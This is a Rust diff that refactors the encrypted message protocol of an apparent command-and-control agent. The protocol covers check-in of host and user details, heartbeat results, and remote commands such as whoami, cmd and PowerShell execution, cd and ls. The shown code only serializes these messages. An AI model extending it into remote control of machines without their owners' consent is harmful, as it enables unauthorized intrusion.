@@ -1,7 +1,7 @@
 use std::marker::PhantomData;
 
 use chacha20poly1305::{ChaCha20Poly1305, Key, Nonce, aead::{Aead, KeyInit}};
-use rand::Rng;
+use rand::RngExt;
 
 use bytes::{Buf, BufMut, Bytes, BytesMut};
 
@@ -11,6 +11,7 @@ const LENGTH_LEN: usize = 8;
 const AAD_LEN: usize = NONCE_LEN + LENGTH_LEN;
 const TAG_LEN: usize = 16;
 
+#[derive(Default)]
 pub struct Packer {
     buf: BytesMut,
 }
@@ -47,6 +48,13 @@ impl Packer {
 
     pub fn pack_bytes(&mut self, value: &[u8]) -> &mut Self {
         self.buf.put_u32(value.len() as u32); // [length][data]
+        self.buf.put_slice(value);
+        self
+    }
+    
+    // 先頭のLength無しパターン
+    // シリアライズ済みオブジェクトのパッキングにのみ使用
+    pub fn pack_raw_bytes(&mut self, value: &[u8]) -> &mut Self {
         self.buf.put_slice(value);
         self
     }
@@ -113,15 +121,15 @@ impl UnPacker {
     pub fn unpack_32bytes(&mut self) -> anyhow::Result<[u8; 32]> {
         let length = self.unpack_u32()? as usize;
         
-        if length != 32 {
-            anyhow::bail!("Invalid length(unpack_u32): length {length}");
-        }
-
-        let key_bytes = self.buf.split_to(32);
-
         if self.buf.remaining() < length {
             anyhow::bail!("buffer overflow");
         }
+
+        if length != 32 {
+            anyhow::bail!("Invalid length(unpack_32bytes): length {length}");
+        }
+
+        let key_bytes = self.buf.split_to(32);
 
         Ok(key_bytes.as_ref().try_into()?)
     }
@@ -130,7 +138,7 @@ impl UnPacker {
     pub fn unpack_utf8_string(&mut self) -> anyhow::Result<String> {
         let bytes = self.unpack_bytes()?;
 
-        let str = String::from_utf8(bytes.to_vec())
+        let str = String::from_utf8(bytes.into())
             .map_err(|e| anyhow::anyhow!("Invalid UTF8 String: {e}"))?; 
         Ok(str)
     }
@@ -171,50 +179,54 @@ impl UnPacker {
 
 }
 
-struct Plain;
-struct Encrypted;
+pub struct Plain;
+pub struct Encrypted;
 
 pub struct Packet<State> {
-    data: Bytes,
+    payload: Bytes,
     _state: PhantomData<State>,
 }
 
 impl Packet<Plain> {
-    pub fn new(data: Bytes) -> Self {
-        Self { data, _state: PhantomData }
+    pub fn new(payload: Bytes) -> Self {
+        Self { payload, _state: PhantomData }
     }
 
     pub fn encrypt(self, key: [u8; 32]) -> anyhow::Result<Packet<Encrypted>> {
         let cipher = ChaCha20Poly1305::new(&Key::from(key));
 
         let mut nonce_bytes = [0_u8; NONCE_LEN];
-        rand::rng().fill_bytes(&mut nonce_bytes);
+        rand::rng().fill(&mut nonce_bytes);
         let nonce: Nonce = Nonce::from(nonce_bytes);
         
-        let mut cipher_text = cipher.encrypt(&nonce, self.data.as_ref())
+        let mut cipher_text = cipher.encrypt(&nonce, self.payload.as_ref())
             .map_err(|e| anyhow::anyhow!("Packet encrypt failed: {e}"))?;
         
         let mut nonce_and_cipher = nonce.to_vec();
         nonce_and_cipher.append(&mut cipher_text);  // nonceは先頭に付与
 
         Ok(Packet {
-            data: nonce_and_cipher.into(),
+            payload: nonce_and_cipher.into(),
             _state: PhantomData,
         })
+    }
+
+    pub fn deserialize(self) -> anyhow::Result<Payload> {
+        Payload::deserialize(self.payload)
     }
 }
 
 impl Packet<Encrypted> {
-    pub fn new(data: Bytes) -> Self {
-        Self { data, _state: PhantomData }
+    pub fn new(payload: Bytes) -> Self {
+        Self { payload, _state: PhantomData }
     }
 
-    pub fn decrypt(&mut self, key: [u8; 32]) -> anyhow::Result<Packet<Plain>> {
-        if self.data.len() < NONCE_LEN {
+    pub fn decrypt(mut self, key: [u8; 32]) -> anyhow::Result<Packet<Plain>> {
+        if self.payload.len() < NONCE_LEN {
            anyhow::bail!("Packet decrypt failed: nonce required");
         }
         
-        let nonce_bytes: [u8; NONCE_LEN] = self.data.split_to(NONCE_LEN)
+        let nonce_bytes: [u8; NONCE_LEN] = self.payload.split_to(NONCE_LEN)
             .as_ref()
             .try_into()
             .map_err(|e| anyhow::anyhow!("expected {NONCE_LEN} bytes: {e}"))?;
@@ -223,11 +235,11 @@ impl Packet<Encrypted> {
 
         let cipher = ChaCha20Poly1305::new(&Key::from(key));
 
-        let plain = cipher.decrypt(&nonce, self.data.as_ref()) // split_toのあとなのでdataはnonce後の暗号文
+        let plain = cipher.decrypt(&nonce, self.payload.as_ref()) // split_toのあとなのでpayloadはnonce後の暗号文
             .map_err(|e| anyhow::anyhow!("Packet decrypt failed: {e}"))?;
 
         Ok(Packet {
-            data: plain.into(),
+            payload: plain.into(),
             _state: PhantomData,
         })
          
@@ -242,25 +254,28 @@ pub struct Payload {
 }
 
 impl Payload {
+    pub fn new(body: MessageBody) -> Self {
+        Self { magic: 0xf3f3, data: body }
+    }
+
     pub fn serialize(&self) -> Bytes {
-        let mut packer = Packer::new();
-
-        packer.pack_u16(self.magic)
-            .pack_bytes(&self.data.serialize());
-
-        packer.finish()
+        // PackerはトップレベルのPayloadで生成し、下位には可変参照として渡し持ち回る
+        let mut p = Packer::new();
+        p.pack_u16(self.magic);
+        self.data.serialize(&mut p);
+        p.finish()
     }
 
     pub fn deserialize(buf: Bytes) -> anyhow::Result<Self> {
-        let mut unpacker = UnPacker::new(buf);
-
-        let magic = unpacker.unpack_u16()?;
+        // UnpackerはトップレベルのPayloadで生成し、下位には可変参照として渡し持ち回る
+        let mut u = UnPacker::new(buf);
+        let magic = u.unpack_u16()?;
 
         if magic != 0xf3f3 {
             anyhow::bail!("Invalid magic number ");
         }
 
-        let data = MessageBody::deserialize(unpacker.buf)?;
+        let data = MessageBody::deserialize(&mut u)?;
         Ok(Self { magic, data })
     }
 }
@@ -290,20 +305,20 @@ pub enum MessageBody {
     } = 0x0004,
 }
 
-const MSG_CHECKIN:    u32 = 0x0001;
-const MSG_CHECKINACK: u32 = 0x0002;
-const MSG_BEAT:       u32 = 0x0003;
-const MSG_COMMAND:    u32 = 0x0004;
+const MSG_CHECKIN:    u8 = 0x01;
+const MSG_CHECKINACK: u8 = 0x02;
+const MSG_BEAT:       u8 = 0x03;
+const MSG_COMMAND:    u8 = 0x04;
 
-const CMD_WHOAMI:     u32 = 0x0001;
-const CMD_RUNCMD:     u32 = 0x0002;
-const CMD_RUNPS :     u32 = 0x0003;
-const CMD_CD:         u32 = 0x0004;
-const CMD_LS:         u32 = 0x0005;
-const CMD_RUNPROCESS: u32 = 0x0006;
+const CMD_WHOAMI:     u16 = 0x0001;
+const CMD_RUNCMD:     u16 = 0x0002;
+const CMD_RUNPS :     u16 = 0x0003;
+const CMD_CD:         u16 = 0x0004;
+const CMD_LS:         u16 = 0x0005;
+const CMD_RUNPROCESS: u16 = 0x0006;
 
 impl MessageBody {
-    pub fn body_id(&self) -> u32 {
+    pub fn body_id(&self) -> u8 {
         match self {
             MessageBody::Checkin { .. } => MSG_CHECKIN,
             MessageBody::CheckinAck { .. } => MSG_CHECKINACK,
@@ -312,9 +327,7 @@ impl MessageBody {
         }
     }
 
-    pub fn serialize(&self) -> Bytes {
-        let mut packer = Packer::new();
-
+    pub fn serialize(&self, p: &mut Packer) {
         match self {
             MessageBody::Checkin { 
                 agent_pubkey, 
@@ -323,92 +336,52 @@ impl MessageBody {
                 username, 
                 process_name 
             } => {
-                packer.pack_u32(self.body_id())
+                p.pack_u8(self.body_id())
                     .pack_bytes(agent_pubkey)
                     .pack_bytes(os.as_bytes())
                     .pack_bytes(hostname.as_bytes())
                     .pack_bytes(username.as_bytes())
                     .pack_bytes(process_name.as_bytes());
-                packer.finish()
             },
 
             MessageBody::CheckinAck { session_pubkey, agent_id } => {
-                packer.pack_bytes(session_pubkey)
+                p.pack_u8(self.body_id())
+                    .pack_bytes(session_pubkey)
                     .pack_u128(*agent_id);
-                packer.finish()
             },
             MessageBody::Command { commands } => {
-                for c in &commands.0 {
-                    match c {
-                        Command::Whoami => {
-                            packer.pack_u32(CMD_WHOAMI);
-                        },
-                        Command::RunCmd { command } => {
-                            packer.pack_u32(CMD_RUNCMD);
-                            packer.pack_bytes(command.as_bytes());
-                        },
-                        Command::RunPs { script } => {
-                            packer.pack_u32(CMD_RUNPS);
-                            packer.pack_bytes(script.as_bytes());
-                        },
-                        Command::Cd { target_dir } => {
-                            packer.pack_u32(CMD_CD);
-                            packer.pack_bytes(target_dir.as_bytes());
-                        },
-                        Command::Ls { target_dir } => {
-                            packer.pack_u32(CMD_CD);
-                            packer.pack_bytes(target_dir.as_bytes());
-                        },
-                        Command::RunProcess => todo!(),
-                    }
-                }
-                packer.finish()
+                p.pack_u8(self.body_id());
+                commands.serialize(p);
             },
             MessageBody::Beat { agent_id, command_results } => {
-                packer.pack_u128(*agent_id);
-
-                for c in &command_results.0 {
-                    match c {
-                        CommandResult::Success { command_id, data } => {
-                            packer.pack_u32(*command_id)
-                                .pack_u8(0x0)  // SUCCESSの場合0
-                                .pack_bytes(data);
-                        },
-                        CommandResult::Error { command_id, winerror, data } => {
-                            packer.pack_u32(*command_id)
-                                .pack_u8(0x1) // ERRORの場合1
-                                .pack_u32(*winerror)
-                                .pack_bytes(data);
-                        },
-                    }
-                }
-                packer.finish()
+                p.pack_u8(self.body_id())
+                    .pack_u128(*agent_id);
+                command_results.serialize(p);
             },
         }
     }
 
-    pub fn deserialize(buf: Bytes) -> anyhow::Result<Self> {
-        let mut unpacker = UnPacker::new(buf);
-        let body_id = unpacker.unpack_u32()?;
+    pub fn deserialize(u: &mut UnPacker) -> anyhow::Result<Self> {
+        let body_id = u.unpack_u8()?;
 
         match body_id {
             MSG_CHECKIN => Ok(Self::Checkin { 
-                agent_pubkey: unpacker.unpack_32bytes()?, 
-                os: unpacker.unpack_utf16le_string()?,
-                hostname: unpacker.unpack_utf16le_string()?,
-                username: unpacker.unpack_utf16le_string()?,
-                process_name: unpacker.unpack_utf16le_string()?,
+                agent_pubkey: u.unpack_32bytes()?, 
+                os: u.unpack_utf16le_string()?,
+                hostname: u.unpack_utf16le_string()?,
+                username: u.unpack_utf16le_string()?,
+                process_name: u.unpack_utf16le_string()?,
             }),
             MSG_CHECKINACK => Ok(Self::CheckinAck { 
-                session_pubkey: unpacker.unpack_32bytes()?,
-                agent_id: unpacker.unpack_u128()?,
+                session_pubkey: u.unpack_32bytes()?,
+                agent_id: u.unpack_u128()?,
             }),
             MSG_BEAT => Ok(Self::Beat { 
-                agent_id: unpacker.unpack_u128()?,
-                command_results: unpacker.unpack_bytes()?,
+                agent_id: u.unpack_u128()?,
+                command_results: CommandResults::deserialize(u)?,
             }),
             MSG_COMMAND => Ok(Self::Command { 
-                commands: () 
+                commands: Commands::deserialize(u)?,
             }),
             _ => anyhow::bail!("Invalid request id"),
         }
@@ -418,8 +391,26 @@ impl MessageBody {
 pub struct Commands(Vec<Command>);
 
 impl Commands {
-    pub fn serialize(&self) -> Bytes { }
-    pub fn deserialize(buf: Bytes) -> anyhow::Result<Self> { }
+    pub fn serialize(&self, p: &mut Packer) {
+        p.pack_u32(self.0.len() as u32); // Commandsの要素数を最初に配置
+        
+        for c in &self.0 {
+            c.serialize(p);
+        }
+    }
+
+    pub fn deserialize(u: &mut UnPacker) -> anyhow::Result<Self> { 
+        let length = u.unpack_u32()?;
+        
+        let mut commands = Commands(vec![]);
+        
+        for _ in 0..length  {
+            commands.0.push(Command::deserialize(u)?);
+        }
+
+        Ok(commands)
+
+    }
 }
 pub enum Command {
     Whoami,
@@ -431,14 +422,79 @@ pub enum Command {
 }
 
 impl Command {
-    pub fn serialize(&self) -> Bytes { }
-    pub fn deserialize(buf: Bytes) -> anyhow::Result<Self> { }
+    pub fn serialize(&self, p: &mut Packer) {
+        match self {
+            Command::Whoami => {
+                p.pack_u16(CMD_WHOAMI);
+            },
+            Command::RunCmd { command } => {
+                p.pack_u16(CMD_RUNCMD);
+                p.pack_bytes(command.as_bytes());
+            },
+            Command::RunPs { script } => {
+                p.pack_u16(CMD_RUNPS);
+                p.pack_bytes(script.as_bytes());
+            },
+            Command::Cd { target_dir } => {
+                p.pack_u16(CMD_CD);
+                p.pack_bytes(target_dir.as_bytes());
+            },
+            Command::Ls { target_dir } => {
+                p.pack_u16(CMD_LS);
+                p.pack_bytes(target_dir.as_bytes());
+            },
+            Command::RunProcess => todo!(),
+        }
+    }
+
+    pub fn deserialize(u: &mut UnPacker) -> anyhow::Result<Self> {
+        let command_id = u.unpack_u16()?;
+
+        match command_id {
+            CMD_WHOAMI     => Ok(Command::Whoami),
+            CMD_RUNCMD     => {
+                let command = u.unpack_utf8_string()?;
+                Ok(Command::RunCmd { command })
+            },
+            CMD_RUNPS      => {
+                let script = u.unpack_utf8_string()?;
+                Ok(Command::RunPs { script })
+            },
+            CMD_CD         => {
+                let target_dir = u.unpack_utf8_string()?;
+                Ok(Command::Cd { target_dir })
+            },
+            CMD_LS         => {
+                let target_dir = u.unpack_utf8_string()?;
+                Ok(Command::Ls { target_dir })
+            },
+            CMD_RUNPROCESS => todo!(),
+            _ => anyhow::bail!("Invalid command id"),
+        }
+    }
 }
 
 pub struct CommandResults(Vec<CommandResult>);
 impl CommandResults {
-    pub fn serialize(&self) -> Bytes { }
-    pub fn deserialize(buf: Bytes) -> anyhow::Result<Self> { }
+    pub fn serialize(&self, p: &mut Packer) { 
+        p.pack_u32(self.0.len() as u32); // CommandResultの要素数を最初に配置
+
+        for c in &self.0 {
+            c.serialize(p);
+        }
+    }
+
+    pub fn deserialize(u: &mut UnPacker) -> anyhow::Result<Self> { 
+        let length = u.unpack_u32()?;
+        
+        let mut results = CommandResults(vec![]);
+        
+        for _ in 0..length  {
+            results.0.push(CommandResult::deserialize(u)?);
+        }
+
+        Ok(results)
+    }
 }
 
 pub enum CommandResult {
@@ -447,6 +503,33 @@ pub enum CommandResult {
 }
 
 impl CommandResult {
-    pub fn serialize(&self) -> Bytes { }
-    pub fn deserialize(buf: Bytes) -> anyhow::Result<Self> { }
+    pub fn serialize(&self, p: &mut Packer) { 
+        match self {
+            CommandResult::Success { command_id, data } => {
+                p.pack_u32(*command_id)
+                    .pack_u8(0x0)
+                    .pack_bytes(data);
+            },
+            CommandResult::Error { command_id, winerror, data } => {
+                p.pack_u32(*command_id)
+                    .pack_u8(0x1)
+                    .pack_u32(*winerror)
+                    .pack_bytes(data);
+            },
+        }
+    }
+
+    pub fn deserialize(u: &mut UnPacker) -> anyhow::Result<Self> { 
+        let command_id = u.unpack_u32()?;
+        let is_error = u.unpack_u8()?;
+
+        if is_error == 0x0 {
+            let data = u.unpack_bytes()?;
+            return Ok(CommandResult::Success { command_id, data });
+        } else {
+            let winerror = u.unpack_u32()?;
+            let data = u.unpack_bytes()?;
+            return Ok(CommandResult::Error { command_id, winerror, data });
+        }
+    }
 }
